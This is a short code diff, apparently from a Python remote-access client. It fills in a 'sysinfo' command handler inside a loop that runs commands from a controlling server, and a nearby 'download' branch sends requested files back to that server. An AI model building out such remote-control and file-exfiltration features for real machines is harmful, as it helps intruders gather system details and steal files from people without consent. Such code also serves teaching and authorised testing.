@@ -21,7 +21,7 @@ def run(host, port):
                 except:
                     continue
             elif command == "sysinfo":
-                pass
+                handle_sysinfo_command(client_socket)
             elif command[:8] == "download":
                 downloaded_data = send_file_to_server(client_socket, command[9:])
                 if downloaded_data.startswith("[!] Error"):
